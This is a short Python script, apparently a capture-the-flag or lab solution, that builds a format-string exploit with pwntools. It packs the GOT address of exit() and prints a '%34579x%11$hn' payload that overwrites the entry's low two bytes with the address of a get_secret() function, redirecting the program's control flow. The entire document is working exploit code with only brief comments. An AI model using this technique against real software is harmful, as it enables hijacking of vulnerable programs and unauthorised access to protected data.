import struct
from pwn import *

#safe stack addr w/o aslr on my kali box
#addr = 0xffffd24c

# got addr for exit()
addr = 0x804a02c

# package addr
print struct.pack("I", addr)

# overwire 2 least significant bytes with addr of get_secret()
# 0x8048713 => 0x8713
print "%34579x%11$hn"

# enter pass
print struct.pack("I", addr)

